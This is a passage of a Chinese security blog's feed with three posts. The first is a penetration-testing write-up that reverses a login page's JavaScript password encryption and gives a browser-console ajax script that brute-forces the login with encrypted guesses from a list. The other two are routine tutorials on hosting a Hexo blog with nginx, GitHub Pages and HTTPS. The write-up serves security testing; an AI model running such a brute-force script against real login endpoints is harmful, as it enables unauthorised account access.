    <content type="html"><![CDATA[<h1 id="console中爆破数据加密传输的思路"><a href="#console中爆破数据加密传输的思路" class="headerlink" title="console中爆破数据加密传输的思路"></a>console中爆破数据加密传输的思路</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>渗透测试过程中遇到web登录的时候，现在很多场景账号密码都是经过js加密之后再请求发送（通过抓包可以看到加密信息）如图一burp抓到的包,request的post的登录包，很明显可以看到password参数的值是经过前端加密之后再进行传输的，遇到这种情况,普通发包的爆破脚本就很难爆破成功。</p><p><img src="https://www.3cac.com/images/20170706/1.png" alt="1"></p><h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><p>分析一波后发现，网站登录时会调用，XLEncryption.js中的encMe函数</p><figure class="hljs highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function encMe(s, k)&#123;</span><br><span class="line">    return stringToHex(encryption(k,s,1,0));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打开chrome，在此处下断点。user输入admin,password输入123456</p><figure class="hljs highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function encMe(s, k)&#123;//s = "123456", k = "CCMS-APP"传进的参数</span><br><span class="line">    return stringToHex(encryption(k,s,1,0));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由此可知传入两个参数一个是，我们的password的值，还有一个是js加密用的key。</p><figure class="hljs highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var myReturn = encMe("123456","CCMS-APP")</span><br><span class="line">console.log(myReturn)</span><br></pre></td></tr></table></figure><p><img src="https://www.3cac.com/images/20170706/2.png" alt="1"></p><h2 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h2><p>exp的基本思路，用ajax把列表里的password发送，根据返回的数据包来判定是否成功</p><p>踩坑：</p><p>Q:变量命名 不要用i 不要用i 不要用i  **肯定会重复 大家都喜欢用i </p><p>A:选一个不常用变量</p><p>Q:jquery ajax请求成功，返回了数据，但是不进success回调函数的问题。</p><p>A:先要处理返回数据。eval转换成json对象。</p><p>Q:在ajax中判断，无法输出想要的密码，每次输出的都是列表中最后一个元素</p><p>A:传参数时传入，两个参数如下面的代码中的function shepi(payload,myperson)</p><figure class="hljs highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">var testpass = ["root", "root123", "admin123", "admin666"];</span><br><span class="line">for(var init=0;init<span class="tag">&lt;<span class="name">testpass.length;init++)&#123;</span></span></span><br><span class="line"><span class="tag"><span class="attr">var</span> <span class="attr">myperson</span> = <span class="string">testpass[init];</span></span></span><br><span class="line"><span class="tag"><span class="attr">window.test</span> = <span class="string">myperson</span></span></span><br><span class="line"><span class="tag"><span class="attr">payload</span> = <span class="string">encMe(myperson,</span>"<span class="attr">CCMS-APP</span>");</span></span><br><span class="line"><span class="tag"><span class="attr">shepi</span>(<span class="attr">payload</span>,<span class="attr">myperson</span>);</span></span><br><span class="line"><span class="tag">&#125;</span></span><br><span class="line"><span class="tag"><span class="attr">function</span> <span class="attr">shepi</span>(<span class="attr">payload</span>,<span class="attr">myperson</span>)&#123;</span></span><br><span class="line"><span class="tag">$<span class="attr">.ajax</span>(&#123;</span></span><br><span class="line"><span class="tag"><span class="attr">url</span> <span class="attr">:</span> "<span class="attr">http:</span>//*****/<span class="attr">Login</span>/<span class="attr">login.do</span>",</span></span><br><span class="line"><span class="tag"><span class="attr">type</span> <span class="attr">:</span> "<span class="attr">POST</span>",</span></span><br><span class="line"><span class="tag"><span class="attr">data</span> <span class="attr">:</span> &#123;</span></span><br><span class="line"><span class="tag"><span class="attr">user:</span>"<span class="attr">bf9198e1396f8c3cf5d1914306c0c9c7</span>",</span></span><br><span class="line"><span class="tag"><span class="attr">password</span> <span class="attr">:</span> <span class="attr">payload</span>,</span></span><br><span class="line"><span class="tag"><span class="attr">openid</span> <span class="attr">:</span> ""</span></span><br><span class="line"><span class="tag">&#125;,</span></span><br><span class="line"><span class="tag"><span class="attr">async:</span> "<span class="attr">false</span>",</span></span><br><span class="line"><span class="tag"><span class="attr">success</span> <span class="attr">:</span> <span class="attr">function</span>(<span class="attr">data</span>)&#123;</span></span><br><span class="line"><span class="tag"><span class="attr">var</span> <span class="attr">data</span> = <span class="string">eval(</span>'(' + <span class="attr">data</span> + ')');</span></span><br><span class="line"><span class="tag"><span class="attr">if</span>(<span class="attr">data.errorCode</span> != <span class="string">-1)&#123;</span></span></span><br><span class="line"><span class="tag"><span class="attr">console.log</span>(<span class="attr">myperson</span>)</span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">&#125;<span class="attr">else</span>&#123;</span></span><br><span class="line"><span class="tag">&#125;</span></span><br><span class="line"><span class="tag">&#125;</span></span><br><span class="line"><span class="tag">&#125;)</span></span><br><span class="line"><span class="tag">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://www.3cac.com/images/20170706/aa.png" alt="aa"></p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>可以直接在chrome console里面直接操作，不需要其他依赖。</p><blockquote><blockquote><p>‘Author’: ‘ka’</p></blockquote></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;console中爆破数据加密传输的思路&quot;&gt;&lt;a href=&quot;#console中爆破数据加密传输的思路&quot; class=&quot;headerlink&quot; title=&quot;console中爆破数据加密传输的思路&quot;&gt;&lt;/a&gt;console中爆破数据加密传输的思路&lt;/h1&gt;&lt;h2 i
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>github上搭建hexo加SSL</title>
    <link href="https://www.3cac.com/2018/07/03/github%E4%B8%8A%E6%90%AD%E5%BB%BAhexo%E5%8A%A0SSL/"/>
    <id>https://www.3cac.com/2018/07/03/github上搭建hexo加SSL/</id>
    <published>2018-07-03T11:30:04.000Z</published>
    <updated>2019-08-21T00:26:13.064Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>由于最近没钱续费服务器，于是折腾github pages,搭建博客。</p><p>##0x01 github </p><p>新建一个repository</p><p>9ak47er.github.io    </p><p>一定要 github用户名 + github.io  不然需要配置网站目录</p><p><img src="https://www.3cac.com/images/20190102/1.jpg" alt="1"></p><p>然后 Settings 》》 Options 》》 GitHub Pages  》》 Source  选择master branch 点击save</p><p>然后访问9ak47er.github.io  已经存在了</p><h2 id="0x02-hexo"><a href="#0x02-hexo" class="headerlink" title="0x02 hexo"></a>0x02 hexo</h2><p>可以参考这里的配置</p><p><a href="https://www.3cac.com/2018/01/02/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AAhttps%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/">https://www.3cac.com/2018/01/02/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AAhttps%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/</a></p><h2 id="0x03-git-配置"><a href="#0x03-git-配置" class="headerlink" title="0x03  git 配置"></a>0x03  git 配置</h2><p>git设置命令</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;username&quot;</span><br><span class="line">git config --global user.email &quot;user@email.com&quot;</span><br><span class="line">ssh-keygen -t rsa -C &quot;user@email.com&quot;</span><br></pre></td></tr></table></figure><p>你需要把邮件地址换成你自己的邮件地址，然后一路回车，使用默认值即可，无需设置密码。</p><p>如果一切顺利的话，可以在用户主目录里找到.ssh目录，里面有id_rsa和id_rsa.pub两个文件.<br>登录你的github，头像处下拉框选择settings。<br>进入设置页后点击侧边栏的SSH and GPG keys按钮。<br>点击New SSH key,title可以任意填，并且将上一步骤生成的id_rsa.pub的内容复制到这里的key输入框中。</p><p>确认</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>直接回车，最后看到这个就说明大功告成：<br>Hi username! You’ve successfully authenticated, but GitHub does not provide shell access.</p><h2 id="0x04-hexo-deploy-网站到github"><a href="#0x04-hexo-deploy-网站到github" class="headerlink" title="0x04 hexo deploy 网站到github"></a>0x04 hexo deploy 网站到github</h2><p>网站根目录下的_config.yml </p><p>修改配置如下</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:9ak47er/9ak47er.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>然后运行</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save     //安装插件</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><h2 id="0x05-修改CNAME-配置SSL"><a href="#0x05-修改CNAME-配置SSL" class="headerlink" title="0x05 修改CNAME+配置SSL"></a>0x05 修改CNAME+配置SSL</h2><p>在博客目录的source文件夹下添加CNAME文件，里面写上你的域名，这里我写的是<a href="http://www.3cac.com。" target="_blank" rel="noopener">www.3cac.com。</a> hexo g编译会自动生成这个文件于 public 中，hexo d部署的时候会吧 public 文件夹 该文件复制于.deploy_git 目录进行发布。</p><p>管理控制台 → 域名与网站（万网） → 域名；在购买的那个域名处，点击「解析」，进行如下设置。</p><p><img src="https://www.3cac.com/images/20190102/2.jpg" alt="2"></p><p>github 中设置 域名并且自动配置SSL</p><p><img src="https://www.3cac.com/images/20190102/3.jpg" alt="2"></p><h2 id="0x06-问题"><a href="#0x06-问题" class="headerlink" title="0x06 问题"></a>0x06 问题</h2><p>github pages 刚建立可能需要等一段时间，大概几十分钟吧</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;由于最近没钱续费服务器，于是折腾github pages,搭建博客。&lt;/p&gt;
&lt;p&gt;##0x01 g
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>搭建一个https的hexo博客</title>
    <link href="https://www.3cac.com/2018/01/02/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AAhexo%E5%8D%9A%E5%AE%A2/"/>
    <id>https://www.3cac.com/2018/01/02/搭建一个hexo博客/</id>
    <published>2018-01-02T10:30:02.000Z</published>
    <updated>2019-08-21T00:35:14.550Z</updated>
    
    <content type="html"><![CDATA[<h1 id="搭建一个https的hexo博客"><a href="#搭建一个https的hexo博客" class="headerlink" title="搭建一个https的hexo博客"></a>搭建一个https的hexo博客</h1><h3 id="0x00-安装环境"><a href="#0x00-安装环境" class="headerlink" title="0x00 安装环境"></a>0x00 安装环境</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 16.04.3 LTS</span><br></pre></td></tr></table></figure><h3 id="0x01安装nodejs"><a href="#0x01安装nodejs" class="headerlink" title="0x01安装nodejs"></a>0x01安装nodejs</h3><p>安装高版本的nodejs，默认的包版本太低。</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -sL https://deb.nodesource.com/setup_8.x | sudo -E bash -</span><br><span class="line"></span><br><span class="line">sudo apt-get install nodejs</span><br></pre></td></tr></table></figure><h3 id="0x02安装nginx"><a href="#0x02安装nginx" class="headerlink" title="0x02安装nginx"></a>0x02安装nginx</h3><p>用来做服务器，方便后面使用https</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nginx</span><br></pre></td></tr></table></figure><h3 id="0x03安装hexo"><a href="#0x03安装hexo" class="headerlink" title="0x03安装hexo"></a>0x03安装hexo</h3><p>hexo就是我博客使用的系统，node.js开发的</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">hexo init blog</span><br><span class="line"><span class="built_in">cd</span> blog</span><br><span class="line">npm install</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure><p>基本的博客就搭完了，可以选取自己喜欢的主题 :</p><figure class="hljs highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hexo.io/themes/</span><br></pre></td></tr></table></figure><p>这里我用的是：</p><figure class="hljs highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/AlynxZhou/hexo-theme-aria</span><br></pre></td></tr></table></figure><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-renderer-njucks hexo-renderer-stylus hexo-generator-search hexo-generator-feed</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/AlynxZhou/hexo-theme-aria themes/aria</span><br></pre></td></tr></table></figure><p>修改你blog目录下的 _config.yml:</p><p>修改theme to aria:</p><figure class="hljs highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theme: aria</span><br></pre></td></tr></table></figure><p>安装hexo-admin,方便我们在线编辑网站</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-admin</span><br><span class="line">hexo server -d</span><br></pre></td></tr></table></figure><p>打开 <a href="http://3cac:4000/admin/" target="_blank" rel="noopener">http://3cac:4000/admin/</a> 可以编辑网站</p><p>点击Settings –&gt;Setup authentification here </p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Username:你的用户名</span><br><span class="line">Password:你的密码</span><br><span class="line">Secret：用于生成cookie的密钥</span><br></pre></td></tr></table></figure><p>然后会在Admin Config Section生成代码<br>复制到你blog目录下的 _config.yml, 然后重启Hexo.就可以用了!</p><figure class="hljs highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin:</span><br><span class="line">  username: username</span><br><span class="line">  password_hash: $****$***$***.**************</span><br><span class="line">  secret: my super secret phrase</span><br></pre></td></tr></table></figure><h3 id="0x04配置博客"><a href="#0x04配置博客" class="headerlink" title="0x04配置博客"></a>0x04配置博客</h3><p>修改nginx配置文件</p><p>/etc/nginx/sites-enabled/default</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen          80;</span><br><span class="line">    server_name     3cac.com;</span><br><span class="line">    location / &#123;</span><br><span class="line">        root        /home/**/**/blog/public;  //你博客的物理地址+public</span><br><span class="line">        index       index.html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了防止nginx修改root路径之后导致的403，我们需要执行如下命令，赋予nginx目录权限</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod o+x blog</span><br></pre></td></tr></table></figure><p>使用pm2启动博客，是一个带有负载均衡功能的Node应用的进程管理器.</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g pm2</span><br></pre></td></tr></table></figure><p>保存下面代码为start.js </p><figure class="hljs highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var spawn = require('child_process').spawn;</span><br><span class="line">free = spawn('hexo', ['server', '-p 1337']); // 其实就是等于执行hexo server -p 1337 将博客启在1337端口上</span><br><span class="line">free.stdout.on('data', function (data) &#123;</span><br><span class="line">    console.log('standard output:\n' + data);</span><br><span class="line">&#125;);</span><br><span class="line">free.stderr.on('data', function (data) &#123;</span><br><span class="line">    console.log('standard error output:\n' + data);</span><br><span class="line">&#125;);</span><br><span class="line">free.on('exit', function (code, signal) &#123;</span><br><span class="line">    console.log('child process eixt ,exit:' + code);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>用pm2启动hexo</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm2 start app.js</span><br></pre></td></tr></table></figure><h3 id="0x05使用Certbot-打造自己免费的https博客"><a href="#0x05使用Certbot-打造自己免费的https博客" class="headerlink" title="0x05使用Certbot 打造自己免费的https博客"></a>0x05使用Certbot 打造自己免费的https博客</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install software-properties-common</span><br><span class="line">$ sudo add-apt-repository ppa:certbot/certbot</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install python-certbot-nginx </span><br><span class="line"></span><br><span class="line">sudo certbot --nginx  //按照提示输入邮箱等操作，然后访问3cac.com,已经用上https了</span><br><span class="line"></span><br><span class="line">sudo certbot renew --dry-run  //自动更新https</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;搭建一个https的hexo博客&quot;&gt;&lt;a href=&quot;#搭建一个https的hexo博客&quot; class=&quot;headerlink&quot; title=&quot;搭建一个https的hexo博客&quot;&gt;&lt;/a&gt;搭建一个https的hexo博客&lt;/h1&gt;&lt;h3 id=&quot;0x00-安装环境
      
    
    </summary>
    
    
  </entry>
  
</feed>
